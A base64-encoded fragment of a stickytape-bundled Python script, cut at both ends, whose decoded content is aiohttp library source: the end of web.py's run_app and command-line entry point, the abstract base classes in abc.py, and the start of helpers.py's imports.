QgcnVubmVyLmNsZWFudXAoKVxyXG5cclxuXHJcbmRlZiBfY2FuY2VsX3Rhc2tzKFxyXG4gICAgdG9fY2FuY2VsOiBTZXRbImFzeW5jaW8uVGFza1tBbnldIl0sIGxvb3A6IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BcclxuKSAtPiBOb25lOlxyXG4gICAgaWYgbm90IHRvX2NhbmNlbDpcclxuICAgICAgICByZXR1cm5cclxuXHJcbiAgICBmb3IgdGFzayBpbiB0b19jYW5jZWw6XHJcbiAgICAgICAgdGFzay5jYW5jZWwoKVxyXG5cclxuICAgIGxvb3AucnVuX3VudGlsX2NvbXBsZXRlKGFzeW5jaW8uZ2F0aGVyKCp0b19jYW5jZWwsIHJldHVybl9leGNlcHRpb25zPVRydWUpKVxyXG5cclxuICAgIGZvciB0YXNrIGluIHRvX2NhbmNlbDpcclxuICAgICAgICBpZiB0YXNrLmNhbmNlbGxlZCgpOlxyXG4gICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgIGlmIHRhc2suZXhjZXB0aW9uKCkgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGxvb3AuY2FsbF9leGNlcHRpb25faGFuZGxlcihcclxuICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAibWVzc2FnZSI6ICJ1bmhhbmRsZWQgZXhjZXB0aW9uIGR1cmluZyBhc3luY2lvLnJ1bigpIHNodXRkb3duIixcclxuICAgICAgICAgICAgICAgICAgICAiZXhjZXB0aW9uIjogdGFzay5leGNlcHRpb24oKSxcclxuICAgICAgICAgICAgICAgICAgICAidGFzayI6IHRhc2ssXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIClcclxuXHJcblxyXG5kZWYgcnVuX2FwcChcclxuICAgIGFwcDogVW5pb25bQXBwbGljYXRpb24sIEF3YWl0YWJsZVtBcHBsaWNhdGlvbl1dLFxyXG4gICAgKixcclxuICAgIGhvc3Q6IE9wdGlvbmFsW1VuaW9uW3N0ciwgSG9zdFNlcXVlbmNlXV0gPSBOb25lLFxyXG4gICAgcG9ydDogT3B0aW9uYWxbaW50XSA9IE5vbmUsXHJcbiAgICBwYXRoOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgIHNvY2s6IE9wdGlvbmFsW3NvY2tldC5zb2NrZXRdID0gTm9uZSxcclxuICAgIHNodXRkb3duX3RpbWVvdXQ6IGZsb2F0ID0gNjAuMCxcclxuICAgIGtlZXBhbGl2ZV90aW1lb3V0OiBmbG9hdCA9IDc1LjAsXHJcbiAgICBzc2xfY29udGV4dDogT3B0aW9uYWxbU1NMQ29udGV4dF0gPSBOb25lLFxyXG4gICAgcHJpbnQ6IENhbGxhYmxlWy4uLiwgTm9uZV0gPSBwcmludCxcclxuICAgIGJhY2tsb2c6IGludCA9IDEyOCxcclxuICAgIGFjY2Vzc19sb2dfY2xhc3M6IFR5cGVbQWJzdHJhY3RBY2Nlc3NMb2dnZXJdID0gQWNjZXNzTG9nZ2VyLFxyXG4gICAgYWNjZXNzX2xvZ19mb3JtYXQ6IHN0ciA9IEFjY2Vzc0xvZ2dlci5MT0dfRk9STUFULFxyXG4gICAgYWNjZXNzX2xvZzogT3B0aW9uYWxbbG9nZ2luZy5Mb2dnZXJdID0gYWNjZXNzX2xvZ2dlcixcclxuICAgIGhhbmRsZV9zaWduYWxzOiBib29sID0gVHJ1ZSxcclxuICAgIHJldXNlX2FkZHJlc3M6IE9wdGlvbmFsW2Jvb2xdID0gTm9uZSxcclxuICAgIHJldXNlX3BvcnQ6IE9wdGlvbmFsW2Jvb2xdID0gTm9uZSxcclxuICAgIGxvb3A6IE9wdGlvbmFsW2FzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BdID0gTm9uZSxcclxuKSAtPiBOb25lOlxyXG4gICAgIiIiUnVuIGFuIGFwcCBsb2NhbGx5IiIiXHJcbiAgICBpZiBsb29wIGlzIE5vbmU6XHJcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8ubmV3X2V2ZW50X2xvb3AoKVxyXG5cclxuICAgICMgQ29uZmlndXJlIGlmIGFuZCBvbmx5IGlmIGluIGRlYnVnZ2luZyBtb2RlIGFuZCB1c2luZyB0aGUgZGVmYXVsdCBsb2dnZXJcclxuICAgIGlmIGxvb3AuZ2V0X2RlYnVnKCkgYW5kIGFjY2Vzc19sb2cgYW5kIGFjY2Vzc19sb2cubmFtZSA9PSAiYWlvaHR0cC5hY2Nlc3MiOlxyXG4gICAgICAgIGlmIGFjY2Vzc19sb2cubGV2ZWwgPT0gbG9nZ2luZy5OT1RTRVQ6XHJcbiAgICAgICAgICAgIGFjY2Vzc19sb2cuc2V0TGV2ZWwobG9nZ2luZy5ERUJVRylcclxuICAgICAgICBpZiBub3QgYWNjZXNzX2xvZy5oYXNIYW5kbGVycygpOlxyXG4gICAgICAgICAgICBhY2Nlc3NfbG9nLmFkZEhhbmRsZXIobG9nZ2luZy5TdHJlYW1IYW5kbGVyKCkpXHJcblxyXG4gICAgbWFpbl90YXNrID0gbG9vcC5jcmVhdGVfdGFzayhcclxuICAgICAgICBfcnVuX2FwcChcclxuICAgICAgICAgICAgYXBwLFxyXG4gICAgICAgICAgICBob3N0PWhvc3QsXHJcbiAgICAgICAgICAgIHBvcnQ9cG9ydCxcclxuICAgICAgICAgICAgcGF0aD1wYXRoLFxyXG4gICAgICAgICAgICBzb2NrPXNvY2ssXHJcbiAgICAgICAgICAgIHNodXRkb3duX3RpbWVvdXQ9c2h1dGRvd25fdGltZW91dCxcclxuICAgICAgICAgICAga2VlcGFsaXZlX3RpbWVvdXQ9a2VlcGFsaXZlX3RpbWVvdXQsXHJcbiAgICAgICAgICAgIHNzbF9jb250ZXh0PXNzbF9jb250ZXh0LFxyXG4gICAgICAgICAgICBwcmludD1wcmludCxcclxuICAgICAgICAgICAgYmFja2xvZz1iYWNrbG9nLFxyXG4gICAgICAgICAgICBhY2Nlc3NfbG9nX2NsYXNzPWFjY2Vzc19sb2dfY2xhc3MsXHJcbiAgICAgICAgICAgIGFjY2Vzc19sb2dfZm9ybWF0PWFjY2Vzc19sb2dfZm9ybWF0LFxyXG4gICAgICAgICAgICBhY2Nlc3NfbG9nPWFjY2Vzc19sb2csXHJcbiAgICAgICAgICAgIGhhbmRsZV9zaWduYWxzPWhhbmRsZV9zaWduYWxzLFxyXG4gICAgICAgICAgICByZXVzZV9hZGRyZXNzPXJldXNlX2FkZHJlc3MsXHJcbiAgICAgICAgICAgIHJldXNlX3BvcnQ9cmV1c2VfcG9ydCxcclxuICAgICAgICApXHJcbiAgICApXHJcblxyXG4gICAgdHJ5OlxyXG4gICAgICAgIGFzeW5jaW8uc2V0X2V2ZW50X2xvb3AobG9vcClcclxuICAgICAgICBsb29wLnJ1bl91bnRpbF9jb21wbGV0ZShtYWluX3Rhc2spXHJcbiAgICBleGNlcHQgKEdyYWNlZnVsRXhpdCwgS2V5Ym9hcmRJbnRlcnJ1cHQpOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICAgICAgcGFzc1xyXG4gICAgZmluYWxseTpcclxuICAgICAgICBfY2FuY2VsX3Rhc2tzKHttYWluX3Rhc2t9LCBsb29wKVxyXG4gICAgICAgIF9jYW5jZWxfdGFza3MoYWxsX3Rhc2tzKGxvb3ApLCBsb29wKVxyXG4gICAgICAgIGxvb3AucnVuX3VudGlsX2NvbXBsZXRlKGxvb3Auc2h1dGRvd25fYXN5bmNnZW5zKCkpXHJcbiAgICAgICAgbG9vcC5jbG9zZSgpXHJcblxyXG5cclxuZGVmIG1haW4oYXJndjogTGlzdFtzdHJdKSAtPiBOb25lOlxyXG4gICAgYXJnX3BhcnNlciA9IEFyZ3VtZW50UGFyc2VyKFxyXG4gICAgICAgIGRlc2NyaXB0aW9uPSJhaW9odHRwLndlYiBBcHBsaWNhdGlvbiBzZXJ2ZXIiLCBwcm9nPSJhaW9odHRwLndlYiJcclxuICAgIClcclxuICAgIGFyZ19wYXJzZXIuYWRkX2FyZ3VtZW50KFxyXG4gICAgICAgICJlbnRyeV9mdW5jIixcclxuICAgICAgICBoZWxwPShcclxuICAgICAgICAgICAgIkNhbGxhYmxlIHJldHVybmluZyB0aGUgYGFpb2h0dHAud2ViLkFwcGxpY2F0aW9uYCBpbnN0YW5jZSB0byAiXHJcbiAgICAgICAgICAgICJydW4uIFNob3VsZCBiZSBzcGVjaWZpZWQgaW4gdGhlIFwnbW9kdWxlOmZ1bmN0aW9uXCcgc3ludGF4LiJcclxuICAgICAgICApLFxyXG4gICAgICAgIG1ldGF2YXI9ImVudHJ5LWZ1bmMiLFxyXG4gICAgKVxyXG4gICAgYXJnX3BhcnNlci5hZGRfYXJndW1lbnQoXHJcbiAgICAgICAgIi1IIixcclxuICAgICAgICAiLS1ob3N0bmFtZSIsXHJcbiAgICAgICAgaGVscD0iVENQL0lQIGhvc3RuYW1lIHRvIHNlcnZlIG9uIChkZWZhdWx0OiAlKGRlZmF1bHQpcikiLFxyXG4gICAgICAgIGRlZmF1bHQ9ImxvY2FsaG9zdCIsXHJcbiAgICApXHJcbiAgICBhcmdfcGFyc2VyLmFkZF9hcmd1bWVudChcclxuICAgICAgICAiLVAiLFxyXG4gICAgICAgICItLXBvcnQiLFxyXG4gICAgICAgIGhlbHA9IlRDUC9JUCBwb3J0IHRvIHNlcnZlIG9uIChkZWZhdWx0OiAlKGRlZmF1bHQpcikiLFxyXG4gICAgICAgIHR5cGU9aW50LFxyXG4gICAgICAgIGRlZmF1bHQ9IjgwODAiLFxyXG4gICAgKVxyXG4gICAgYXJnX3BhcnNlci5hZGRfYXJndW1lbnQoXHJcbiAgICAgICAgIi1VIixcclxuICAgICAgICAiLS1wYXRoIixcclxuICAgICAgICBoZWxwPSJVbml4IGZpbGUgc3lzdGVtIHBhdGggdG8gc2VydmUgb24uIFNwZWNpZnlpbmcgYSBwYXRoIHdpbGwgY2F1c2UgIlxyXG4gICAgICAgICJob3N0bmFtZSBhbmQgcG9ydCBhcmd1bWVudHMgdG8gYmUgaWdub3JlZC4iLFxyXG4gICAgKVxyXG4gICAgYXJncywgZXh0cmFfYXJndiA9IGFyZ19wYXJzZXIucGFyc2Vfa25vd25fYXJncyhhcmd2KVxyXG5cclxuICAgICMgSW1wb3J0IGxvZ2ljXHJcbiAgICBtb2Rfc3RyLCBfLCBmdW5jX3N0ciA9IGFyZ3MuZW50cnlfZnVuYy5wYXJ0aXRpb24oIjoiKVxyXG4gICAgaWYgbm90IGZ1bmNfc3RyIG9yIG5vdCBtb2Rfc3RyOlxyXG4gICAgICAgIGFyZ19wYXJzZXIuZXJyb3IoIlwnZW50cnktZnVuY1wnIG5vdCBpbiBcJ21vZHVsZTpmdW5jdGlvblwnIHN5bnRheCIpXHJcbiAgICBpZiBtb2Rfc3RyLnN0YXJ0c3dpdGgoIi4iKTpcclxuICAgICAgICBhcmdfcGFyc2VyLmVycm9yKCJyZWxhdGl2ZSBtb2R1bGUgbmFtZXMgbm90IHN1cHBvcnRlZCIpXHJcbiAgICB0cnk6XHJcbiAgICAgICAgbW9kdWxlID0gaW1wb3J0X21vZHVsZShtb2Rfc3RyKVxyXG4gICAgZXhjZXB0IEltcG9ydEVycm9yIGFzIGV4OlxyXG4gICAgICAgIGFyZ19wYXJzZXIuZXJyb3IoZiJ1bmFibGUgdG8gaW1wb3J0IHttb2Rfc3RyfToge2V4fSIpXHJcbiAgICB0cnk6XHJcbiAgICAgICAgZnVuYyA9IGdldGF0dHIobW9kdWxlLCBmdW5jX3N0cilcclxuICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjpcclxuICAgICAgICBhcmdfcGFyc2VyLmVycm9yKGYibW9kdWxlIHttb2Rfc3RyIXJ9IGhhcyBubyBhdHRyaWJ1dGUge2Z1bmNfc3RyIXJ9IilcclxuXHJcbiAgICAjIENvbXBhdGliaWxpdHkgbG9naWNcclxuICAgIGlmIGFyZ3MucGF0aCBpcyBub3QgTm9uZSBhbmQgbm90IGhhc2F0dHIoc29ja2V0LCAiQUZfVU5JWCIpOlxyXG4gICAgICAgIGFyZ19wYXJzZXIuZXJyb3IoXHJcbiAgICAgICAgICAgICJmaWxlIHN5c3RlbSBwYXRocyBub3Qgc3VwcG9ydGVkIGJ5IHlvdXIgb3BlcmF0aW5nIiAiIGVudmlyb25tZW50IlxyXG4gICAgICAgIClcclxuXHJcbiAgICBsb2dnaW5nLmJhc2ljQ29uZmlnKGxldmVsPWxvZ2dpbmcuREVCVUcpXHJcblxyXG4gICAgYXBwID0gZnVuYyhleHRyYV9hcmd2KVxyXG4gICAgcnVuX2FwcChhcHAsIGhvc3Q9YXJncy5ob3N0bmFtZSwgcG9ydD1hcmdzLnBvcnQsIHBhdGg9YXJncy5wYXRoKVxyXG4gICAgYXJnX3BhcnNlci5leGl0KG1lc3NhZ2U9IlN0b3BwZWRcXG4iKVxyXG5cclxuXHJcbmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6ICAjIHByYWdtYTogbm8gYnJhbmNoXHJcbiAgICBtYWluKHN5cy5hcmd2WzE6XSkgICMgcHJhZ21hOiBubyBjb3ZlclxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC9hYmMucHknLCBiJ2ltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBsb2dnaW5nXHJcbmZyb20gYWJjIGltcG9ydCBBQkMsIGFic3RyYWN0bWV0aG9kXHJcbmZyb20gY29sbGVjdGlvbnMuYWJjIGltcG9ydCBTaXplZFxyXG5mcm9tIGh0dHAuY29va2llcyBpbXBvcnQgQmFzZUNvb2tpZSwgTW9yc2VsXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoXHJcbiAgICBUWVBFX0NIRUNLSU5HLFxyXG4gICAgQW55LFxyXG4gICAgQXdhaXRhYmxlLFxyXG4gICAgQ2FsbGFibGUsXHJcbiAgICBEaWN0LFxyXG4gICAgR2VuZXJhdG9yLFxyXG4gICAgSXRlcmFibGUsXHJcbiAgICBMaXN0LFxyXG4gICAgT3B0aW9uYWwsXHJcbiAgICBUdXBsZSxcclxuKVxyXG5cclxuZnJvbSBtdWx0aWRpY3QgaW1wb3J0IENJTXVsdGlEaWN0XHJcbmZyb20geWFybCBpbXBvcnQgVVJMXHJcblxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBnZXRfcnVubmluZ19sb29wXHJcbmZyb20gLnR5cGVkZWZzIGltcG9ydCBMb29zZUNvb2tpZXNcclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIGZyb20gLndlYl9hcHAgaW1wb3J0IEFwcGxpY2F0aW9uXHJcbiAgICBmcm9tIC53ZWJfZXhjZXB0aW9ucyBpbXBvcnQgSFRUUEV4Y2VwdGlvblxyXG4gICAgZnJvbSAud2ViX3JlcXVlc3QgaW1wb3J0IEJhc2VSZXF1ZXN0LCBSZXF1ZXN0XHJcbiAgICBmcm9tIC53ZWJfcmVzcG9uc2UgaW1wb3J0IFN0cmVhbVJlc3BvbnNlXHJcbmVsc2U6XHJcbiAgICBCYXNlUmVxdWVzdCA9IFJlcXVlc3QgPSBBcHBsaWNhdGlvbiA9IFN0cmVhbVJlc3BvbnNlID0gTm9uZVxyXG4gICAgSFRUUEV4Y2VwdGlvbiA9IE5vbmVcclxuXHJcblxyXG5jbGFzcyBBYnN0cmFjdFJvdXRlcihBQkMpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZnJvemVuID0gRmFsc2VcclxuXHJcbiAgICBkZWYgcG9zdF9pbml0KHNlbGYsIGFwcDogQXBwbGljYXRpb24pIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiUG9zdCBpbml0IHN0YWdlLlxyXG5cclxuICAgICAgICBOb3QgYW4gYWJzdHJhY3QgbWV0aG9kIGZvciBzYWtlIG9mIGJhY2t3YXJkIGNvbXBhdGliaWxpdHksXHJcbiAgICAgICAgYnV0IGlmIHRoZSByb3V0ZXIgd2FudHMgdG8gYmUgYXdhcmUgb2YgdGhlIGFwcGxpY2F0aW9uXHJcbiAgICAgICAgaXQgY2FuIG92ZXJyaWRlIHRoaXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZnJvemVuKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Zyb3plblxyXG5cclxuICAgIGRlZiBmcmVlemUoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICAiIiJGcmVlemUgcm91dGVyLiIiIlxyXG4gICAgICAgIHNlbGYuX2Zyb3plbiA9IFRydWVcclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGFzeW5jIGRlZiByZXNvbHZlKHNlbGYsIHJlcXVlc3Q6IFJlcXVlc3QpIC0+ICJBYnN0cmFjdE1hdGNoSW5mbyI6XHJcbiAgICAgICAgIiIiUmV0dXJuIE1BVENIX0lORk8gZm9yIGdpdmVuIHJlcXVlc3QiIiJcclxuXHJcblxyXG5jbGFzcyBBYnN0cmFjdE1hdGNoSW5mbyhBQkMpOlxyXG4gICAgQHByb3BlcnR5ICAjIHByYWdtYTogbm8gYnJhbmNoXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBoYW5kbGVyKHNlbGYpIC0+IENhbGxhYmxlW1tSZXF1ZXN0XSwgQXdhaXRhYmxlW1N0cmVhbVJlc3BvbnNlXV06XHJcbiAgICAgICAgIiIiRXhlY3V0ZSBtYXRjaGVkIHJlcXVlc3QgaGFuZGxlciIiIlxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZXhwZWN0X2hhbmRsZXIoc2VsZikgLT4gQ2FsbGFibGVbW1JlcXVlc3RdLCBBd2FpdGFibGVbTm9uZV1dOlxyXG4gICAgICAgICIiIkV4cGVjdCBoYW5kbGVyIGZvciAxMDAtY29udGludWUgcHJvY2Vzc2luZyIiIlxyXG5cclxuICAgIEBwcm9wZXJ0eSAgIyBwcmFnbWE6IG5vIGJyYW5jaFxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgaHR0cF9leGNlcHRpb24oc2VsZikgLT4gT3B0aW9uYWxbSFRUUEV4Y2VwdGlvbl06XHJcbiAgICAgICAgIiIiSFRUUEV4Y2VwdGlvbiBpbnN0YW5jZSByYWlzZWQgb24gcm91dGVyXCdzIHJlc29sdmluZywgb3IgTm9uZSIiIlxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZCAgIyBwcmFnbWE6IG5vIGJyYW5jaFxyXG4gICAgZGVmIGdldF9pbmZvKHNlbGYpIC0+IERpY3Rbc3RyLCBBbnldOlxyXG4gICAgICAgICIiIlJldHVybiBhIGRpY3Qgd2l0aCBhZGRpdGlvbmFsIGluZm8gdXNlZnVsIGZvciBpbnRyb3NwZWN0aW9uIiIiXHJcblxyXG4gICAgQHByb3BlcnR5ICAjIHByYWdtYTogbm8gYnJhbmNoXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBhcHBzKHNlbGYpIC0+IFR1cGxlW0FwcGxpY2F0aW9uLCAuLi5dOlxyXG4gICAgICAgICIiIlN0YWNrIG9mIG5lc3RlZCBhcHBsaWNhdGlvbnMuXHJcblxyXG4gICAgICAgIFRvcCBsZXZlbCBhcHBsaWNhdGlvbiBpcyBsZWZ0LW1vc3QgZWxlbWVudC5cclxuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgYWRkX2FwcChzZWxmLCBhcHA6IEFwcGxpY2F0aW9uKSAtPiBOb25lOlxyXG4gICAgICAgICIiIkFkZCBhcHBsaWNhdGlvbiB0byB0aGUgbmVzdGVkIGFwcHMgc3RhY2suIiIiXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZnJlZXplKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiRnJlZXplIHRoZSBtYXRjaCBpbmZvLlxyXG5cclxuICAgICAgICBUaGUgbWV0aG9kIGlzIGNhbGxlZCBhZnRlciByb3V0ZSByZXNvbHV0aW9uLlxyXG5cclxuICAgICAgICBBZnRlciB0aGUgY2FsbCAuYWRkX2FwcCgpIGlzIGZvcmJpZGRlbi5cclxuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuY2xhc3MgQWJzdHJhY3RWaWV3KEFCQyk6XHJcbiAgICAiIiJBYnN0cmFjdCBjbGFzcyBiYXNlZCB2aWV3LiIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCByZXF1ZXN0OiBSZXF1ZXN0KSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX3JlcXVlc3QgPSByZXF1ZXN0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmVxdWVzdChzZWxmKSAtPiBSZXF1ZXN0OlxyXG4gICAgICAgICIiIlJlcXVlc3QgaW5zdGFuY2UuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlcXVlc3RcclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBfX2F3YWl0X18oc2VsZikgLT4gR2VuZXJhdG9yW0FueSwgTm9uZSwgU3RyZWFtUmVzcG9uc2VdOlxyXG4gICAgICAgICIiIkV4ZWN1dGUgdGhlIHZpZXcgaGFuZGxlci4iIiJcclxuXHJcblxyXG5jbGFzcyBBYnN0cmFjdFJlc29sdmVyKEFCQyk6XHJcbiAgICAiIiJBYnN0cmFjdCBETlMgcmVzb2x2ZXIuIiIiXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBhc3luYyBkZWYgcmVzb2x2ZShzZWxmLCBob3N0OiBzdHIsIHBvcnQ6IGludCwgZmFtaWx5OiBpbnQpIC0+IExpc3RbRGljdFtzdHIsIEFueV1dOlxyXG4gICAgICAgICIiIlJldHVybiBJUCBhZGRyZXNzIGZvciBnaXZlbiBob3N0bmFtZSIiIlxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiUmVsZWFzZSByZXNvbHZlciIiIlxyXG5cclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIEl0ZXJhYmxlQmFzZSA9IEl0ZXJhYmxlW01vcnNlbFtzdHJdXVxyXG5lbHNlOlxyXG4gICAgSXRlcmFibGVCYXNlID0gSXRlcmFibGVcclxuXHJcblxyXG5DbGVhckNvb2tpZVByZWRpY2F0ZSA9IENhbGxhYmxlW1siTW9yc2VsW3N0cl0iXSwgYm9vbF1cclxuXHJcblxyXG5jbGFzcyBBYnN0cmFjdENvb2tpZUphcihTaXplZCwgSXRlcmFibGVCYXNlKTpcclxuICAgICIiIkFic3RyYWN0IENvb2tpZSBKYXIuIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsICosIGxvb3A6IE9wdGlvbmFsW2FzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9sb29wID0gZ2V0X3J1bm5pbmdfbG9vcChsb29wKVxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGNsZWFyKHNlbGYsIHByZWRpY2F0ZTogT3B0aW9uYWxbQ2xlYXJDb29raWVQcmVkaWNhdGVdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICAiIiJDbGVhciBhbGwgY29va2llcyBpZiBubyBwcmVkaWNhdGUgaXMgcGFzc2VkLiIiIlxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGNsZWFyX2RvbWFpbihzZWxmLCBkb21haW46IHN0cikgLT4gTm9uZTpcclxuICAgICAgICAiIiJDbGVhciBhbGwgY29va2llcyBmb3IgZG9tYWluIGFuZCBhbGwgc3ViZG9tYWlucy4iIiJcclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiB1cGRhdGVfY29va2llcyhzZWxmLCBjb29raWVzOiBMb29zZUNvb2tpZXMsIHJlc3BvbnNlX3VybDogVVJMID0gVVJMKCkpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiVXBkYXRlIGNvb2tpZXMuIiIiXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZmlsdGVyX2Nvb2tpZXMoc2VsZiwgcmVxdWVzdF91cmw6IFVSTCkgLT4gIkJhc2VDb29raWVbc3RyXSI6XHJcbiAgICAgICAgIiIiUmV0dXJuIHRoZSBqYXJcJ3MgY29va2llcyBmaWx0ZXJlZCBieSB0aGVpciBhdHRyaWJ1dGVzLiIiIlxyXG5cclxuXHJcbmNsYXNzIEFic3RyYWN0U3RyZWFtV3JpdGVyKEFCQyk6XHJcbiAgICAiIiJBYnN0cmFjdCBzdHJlYW0gd3JpdGVyLiIiIlxyXG5cclxuICAgIGJ1ZmZlcl9zaXplID0gMFxyXG4gICAgb3V0cHV0X3NpemUgPSAwXHJcbiAgICBsZW5ndGggPSAwICAjIHR5cGU6IE9wdGlvbmFsW2ludF1cclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGFzeW5jIGRlZiB3cml0ZShzZWxmLCBjaHVuazogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiV3JpdGUgY2h1bmsgaW50byBzdHJlYW0uIiIiXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBhc3luYyBkZWYgd3JpdGVfZW9mKHNlbGYsIGNodW5rOiBieXRlcyA9IGIiIikgLT4gTm9uZTpcclxuICAgICAgICAiIiJXcml0ZSBsYXN0IGNodW5rLiIiIlxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgYXN5bmMgZGVmIGRyYWluKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiRmx1c2ggdGhlIHdyaXRlIGJ1ZmZlci4iIiJcclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBlbmFibGVfY29tcHJlc3Npb24oc2VsZiwgZW5jb2Rpbmc6IHN0ciA9ICJkZWZsYXRlIikgLT4gTm9uZTpcclxuICAgICAgICAiIiJFbmFibGUgSFRUUCBib2R5IGNvbXByZXNzaW9uIiIiXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZW5hYmxlX2NodW5raW5nKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiRW5hYmxlIEhUVFAgY2h1bmtlZCBtb2RlIiIiXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBhc3luYyBkZWYgd3JpdGVfaGVhZGVycyhcclxuICAgICAgICBzZWxmLCBzdGF0dXNfbGluZTogc3RyLCBoZWFkZXJzOiAiQ0lNdWx0aURpY3Rbc3RyXSJcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAiIiJXcml0ZSBIVFRQIGhlYWRlcnMiIiJcclxuXHJcblxyXG5jbGFzcyBBYnN0cmFjdEFjY2Vzc0xvZ2dlcihBQkMpOlxyXG4gICAgIiIiQWJzdHJhY3Qgd3JpdGVyIHRvIGFjY2VzcyBsb2cuIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGxvZ2dlcjogbG9nZ2luZy5Mb2dnZXIsIGxvZ19mb3JtYXQ6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmxvZ2dlciA9IGxvZ2dlclxyXG4gICAgICAgIHNlbGYubG9nX2Zvcm1hdCA9IGxvZ19mb3JtYXRcclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBsb2coc2VsZiwgcmVxdWVzdDogQmFzZVJlcXVlc3QsIHJlc3BvbnNlOiBTdHJlYW1SZXNwb25zZSwgdGltZTogZmxvYXQpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiRW1pdCBsb2cgdG8gbG9nZ2VyLiIiIlxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC9oZWxwZXJzLnB5JywgYiciIiJWYXJpb3VzIGhlbHBlciBmdW5jdGlvbnMiIiJcclxuXHJcbmltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBiYXNlNjRcclxuaW1wb3J0IGJpbmFzY2lpXHJcbmltcG9ydCBjZ2lcclxuaW1wb3J0IGRhdGV0aW1lXHJcbmltcG9ydCBmdW5jdG9vbHNcclxuaW1wb3J0IGluc3BlY3RcclxuaW1wb3J0IG5ldHJjXHJcbmltcG9ydCBvc1xyXG5pbXBvcnQgcGxhdGZvcm1cclxuaW1wb3J0IHJlXHJcbmltcG9ydCBzeXNcclxuaW1wb3J0IHRpbWVcclxuaW1wb3J0IHdhcm5pbmdzXHJcbmltcG9ydCB3ZWFrcmVmXHJcbmZyb20gY29sbGVjdGlvbnMgaW1wb3J0IG5hbWVkdHVwbGVcclxuZnJvbSBjb250ZXh0bGliIGltcG9ydCBzdXBwcmVzc1xyXG5mcm9tIGVtYWlsLnV0aWxzIGltcG9ydCBw